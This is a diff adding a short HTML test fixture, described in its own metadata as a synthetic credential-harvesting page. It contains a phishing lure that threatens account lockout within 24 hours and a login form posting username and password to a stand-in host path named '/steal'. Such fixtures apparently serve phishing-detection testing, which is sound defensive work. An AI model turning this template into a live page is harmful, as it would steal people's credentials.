@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Account Verification Required</title>
+  <meta name="description" content="Test fixture: synthetic credential-harvesting page (safe .example TLD, no real infrastructure).">
+</head>
+<body>
+  <h1>Verify your account</h1>
+  <p>Your account will be locked in 24 hours unless you confirm your identity immediately.</p>
+  <form action="http://secure-login-verify.example/steal" method="post">
+    <label>Username <input type="text" name="user" autocomplete="username"></label>
+    <label>Secret <input type="password" name="pw" autocomplete="current-password"></label>
+    <button type="submit">Confirm now</button>
+  </form>
+  <a href="https://www.wikipedia.org/wiki/Phishing">help article</a>
+</body>
+</html>
